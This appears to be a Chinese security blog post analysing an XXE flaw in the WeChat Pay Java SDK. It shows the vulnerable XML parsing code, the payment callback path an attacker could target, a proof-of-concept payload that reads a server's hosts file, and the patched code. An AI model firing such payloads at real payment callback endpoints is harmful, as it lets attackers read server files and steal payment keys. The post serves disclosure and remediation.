---
layout: post
title: "微信支付SDK XXE漏洞分析"
date: 2018-07-04
description: "微信支付SDK XXE漏洞分析"
tag: 应用安全
---

------

## 漏洞描述
微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何文件，一般支付服务器均为核心服务器，出现XXE导致任意文件。另外，一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品）。

## 漏洞来源
[http://seclists.org/fulldisclosure/2018/Jul/3](http://seclists.org/fulldisclosure/2018/Jul/3)  
[https://xz.aliyun.com/t/2427](https://xz.aliyun.com/t/2427)

## 漏洞分析
[微信支付Java SDK 下载](https://drive.google.com/file/d/1AoxfkxD7Kokl0uqILaqTnGAXSUR1o6ud/view?usp=sharing)
### 漏洞关键代码
* WXPayUtil.java
```java
public static Map<String, String> xmlToMap(String strXML) throws Exception {
        try {
            Map<String, String> data = new HashMap<String, String>();
            DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
            DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
            InputStream stream = new ByteArrayInputStream(strXML.getBytes("UTF-8"));
            org.w3c.dom.Document doc = documentBuilder.parse(stream);
            doc.getDocumentElement().normalize();
            NodeList nodeList = doc.getDocumentElement().getChildNodes();
            for (int idx = 0; idx < nodeList.getLength(); ++idx) {
                Node node = nodeList.item(idx);
                if (node.getNodeType() == Node.ELEMENT_NODE) {
                    org.w3c.dom.Element element = (org.w3c.dom.Element) node;
                    data.put(element.getNodeName(), element.getTextContent());
                }
            }
            try {
                stream.close();
            } catch (Exception ex) {
                // do nothing
            }
            return data;
        } catch (Exception ex) {
            WXPayUtil.getLogger().warn("Invalid XML, can not convert to map. Error message: {}. XML content: {}", ex.getMessage(), strXML);
            throw ex;
        }

    }
```

微信SDK的xmlToMap方法接受并处理XML数据，但是默认支持外部实体解析，所以只要可以控制strXML就能导致XXE漏洞。

### 微信SDK支付逻辑
根据README可以看到，微信SDK的支付逻辑如下：
1. 首先统一下单

```java
import com.github.wxpay.sdk.WXPay;
import java.util.HashMap;
import java.util.Map;

public class WXPayExample {

    public static void main(String[] args) throws Exception {

        MyConfig config = new MyConfig();
        WXPay wxpay = new WXPay(config);

        Map<String, String> data = new HashMap<String, String>();
        data.put("body", "腾讯充值中心-QQ会员充值");
        data.put("out_trade_no", "2016090910595900000012");
        data.put("device_info", "");
        data.put("fee_type", "CNY");
        data.put("total_fee", "1");
        data.put("spbill_create_ip", "123.12.12.123");
        data.put("notify_url", "http://www.example.com/wxpay/notify");
        data.put("trade_type", "NATIVE");  // 此处指定为扫码支付
        data.put("product_id", "12");

        try {
            Map<String, String> resp = wxpay.unifiedOrder(data);
            System.out.println(resp);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

其中notify_url是接入方自己构建的web接口，用于异步接收微信支付结果通知的回调地址。
2. 处理微信回调

```java
import com.github.wxpay.sdk.WXPay;
import com.github.wxpay.sdk.WXPayUtil;
import java.util.Map;

public class WXPayExample {

    public static void main(String[] args) throws Exception {

        String notifyData = "...."; // 支付结果通知的xml格式数据

        MyConfig config = new MyConfig();
        WXPay wxpay = new WXPay(config);

        Map<String, String> notifyMap = WXPayUtil.xmlToMap(notifyData);  // 转换成map

        if (wxpay.isPayResultNotifySignatureValid(notifyMap)) {
            // 签名正确
            // 进行处理。
            // 注意特殊情况：订单已经退款，但收到了支付结果成功的通知，不应把商户侧订单状态从退款改成支付成功
        }
        else {
            // 签名错误，如果数据里没有sign字段，也认为是签名错误
        }
    }

}
```

nodifyData实际是微信给接入方回调地址notify_url返回的xml数据。接入方使用xmlToMap处理nodifydata。攻击者只需要知道nodify_url，就可以构造XXE Payload进行攻击。

### 漏洞复现
简单修改SDK中示例代码的xmlStr为XXE Payload，查看可否实现XXE攻击。
* TestWXPay.java

```java
    /**
     * 小测试
     */
    public void test001() {
        String xmlStr="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                "<!DOCTYPE root [\n" +
                "\t<!ENTITY xxe SYSTEM \"file:///C:\\Windows\\System32\\drivers\\etc\\hosts\">]>\n" +
                "<root>\n" +
                "\t<xxe>&xxe;</xxe>\n" +
                "</root>";
        try {
            System.out.println(xmlStr);
            System.out.println("+++++++++++++++++");
//            System.out.println(WXPayUtil.isSignatureValid(xmlStr, config.getKey())); //此处可注释测试，接入方处理微信回调时也是先调用xmlToMap再校验签名的
            Map<String, String> hm = WXPayUtil.xmlToMap(xmlStr);
            System.out.println("+++++++++++++++++");
            System.out.println(hm);
//            System.out.println(hm.get("attach").length()); //此处可注释

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
```

* 执行结果  
![](/images/posts/app_sec/WXPay_result1_2018-07-04_20-53-14.png)  
已经成功读取hosts文件。证明只要接入方使用了此版本SDK并且攻击者知道回调地址，就可以成功实现XXE攻击。

## 修复建议
`禁用外部实体解析`  
目前微信支付Java SDK已经修复了代码，可以在[这里](https://drive.google.com/file/d/1cHtElmTLfDRov1poIAAD70jwa8NGh78P/view?usp=sharing)下载修复后代码。
* WXPayUtil.java  
```java
 public static Map<String, String> xmlToMap(String strXML) throws Exception {
        try {
            Map<String, String> data = new HashMap<String, String>();
            DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
			documentBuilderFactory.setExpandEntityReferences(false); //禁用外部实体解析
			documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true); //开启XML安全处理
            DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
            InputStream stream = new ByteArrayInputStream(strXML.getBytes("UTF-8"));
            org.w3c.dom.Document doc = documentBuilder.parse(stream);
            doc.getDocumentElement().normalize();
            NodeList nodeList = doc.getDocumentElement().getChildNodes();
            for (int idx = 0; idx < nodeList.getLength(); ++idx) {
                Node node = nodeList.item(idx);
                if (node.getNodeType() == Node.ELEMENT_NODE) {
                    org.w3c.dom.Element element = (org.w3c.dom.Element) node;
                    data.put(element.getNodeName(), element.getTextContent());
                }
            }
            try {
                stream.close();
            } catch (Exception ex) {
                // do nothing
            }
            return data;
        } catch (Exception ex) {
            WXPayUtil.getLogger().warn("Invalid XML, can not convert to map. Error message: {}. XML content: {}", ex.getMessage(), strXML);
            throw ex;
        }

    }
```
* 修复后执行结果  
![](/images/posts/app_sec/WXPay_result2_2018-07-04_20-53-14.png)  